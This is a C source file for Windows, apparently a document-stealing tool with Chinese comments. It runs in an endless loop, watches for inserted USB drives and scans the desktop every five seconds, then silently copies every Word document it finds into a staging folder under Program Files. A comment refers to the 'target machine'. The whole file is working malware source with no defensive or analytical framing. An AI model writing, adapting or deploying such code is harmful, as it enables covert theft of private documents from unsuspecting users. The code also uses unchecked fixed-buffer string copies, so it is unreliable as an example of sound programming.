#include <Windows.h>
#include <shlobj.h>

#pragma warning(disable: 4996)

#define MY_DEBUG

// 遍历所有文件
void FindDocFile(char *pFilePath);

// 目标文档拷贝目录
char *szTmpPath = "C:\\Program Files\\data_tmp";

INT APIENTRY WinMain(	HINSTANCE	hInstance,
						HINSTANCE	hPrevInstance, 
						LPSTR		lpCmdLine, 
						INT			iCmdShow  )
{
	// 创建C盘下的目标文件夹
	CreateDirectoryA(szTmpPath, NULL);

	char szBuf[100];
	ZeroMemory(szBuf, sizeof(szBuf));

 	while (TRUE)
 	{
		Sleep(5000);
		// 获得当前磁盘等驱动器信息
		DWORD len = GetLogicalDriveStringsA(sizeof(szBuf), szBuf);

		for (char *pDrive = szBuf; *pDrive != NULL; pDrive += strlen(pDrive)+1) {
			char *pDrivePath = pDrive;
			// 获取驱动器类型信息，简单起见，不区分软驱和U盘（目标机器没有软驱...）
			if (GetDriveTypeA(pDrivePath) ==DRIVE_REMOVABLE) {
#ifdef MY_DEBUG
				char szShow[50] = "发现U盘，位于 ";
				strcat(szShow, pDrivePath);
				MessageBoxA(NULL, szShow, "信息", MB_OK);
#endif
				FindDocFile(pDrivePath);
			}
		}
		// 获取桌面路径
		LPITEMIDLIST pidl;   
		char szDesktopDir[MAX_PATH];  
		if (SUCCEEDED(SHGetSpecialFolderLocation(NULL, CSIDL_DESKTOP, &pidl))) {    
			SHGetPathFromIDListA(pidl, szDesktopDir);    
		}
		strcat(szDesktopDir, "\\");
		// 拷贝桌面的文档
		FindDocFile(szDesktopDir);
	}

	return 0;
}

// 遍历所有文件
void FindDocFile(char *pFilePath)
{
	WIN32_FIND_DATAA findData;
	char szFindPath[MAX_PATH];

	strcpy(szFindPath, pFilePath);
	strcat(szFindPath, "*.*");

	// 查找第一个文件
	HANDLE hFile = FindFirstFileA(szFindPath, &findData);
	do {
		if (strcmp(".", findData.cFileName) == 0 || strcmp("..", findData.cFileName) == 0) {
			continue;
		}

		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			char szNewFindPath[MAX_PATH];
			strcpy(szNewFindPath, pFilePath);
			strcat(szNewFindPath, findData.cFileName);
			strcat(szNewFindPath, "\\");
			// 对目录进行递归处理
			FindDocFile(szNewFindPath);
		} else {
			char *pFileName = findData.cFileName;
			// 找到文件扩展名位置
			while (*pFileName++ != '.')
				;
			// 只要 doc 和 docx 文件
			if (strcmp(pFileName, "doc") == 0 || strcmp(pFileName, "docx") == 0) {
				// 待复制的源文件路径
				char szCopyFrom[MAX_PATH];
				strcpy(szCopyFrom, pFilePath);
				strcat(szCopyFrom, findData.cFileName);
				// 待复制的目标文件路径
				char szCopyTo[MAX_PATH];
				strcpy(szCopyTo, szTmpPath);
				strcat(szCopyTo, "\\");
				strcat(szCopyTo, findData.cFileName);
#ifdef MY_DEBUG
				MessageBoxA(NULL, szCopyFrom, "发现word文件", MB_OK);
#endif
				// 复制文件
				CopyFileA(szCopyFrom, szCopyTo, TRUE);
			}
		}
	}while (FindNextFileA(hFile, &findData));
}
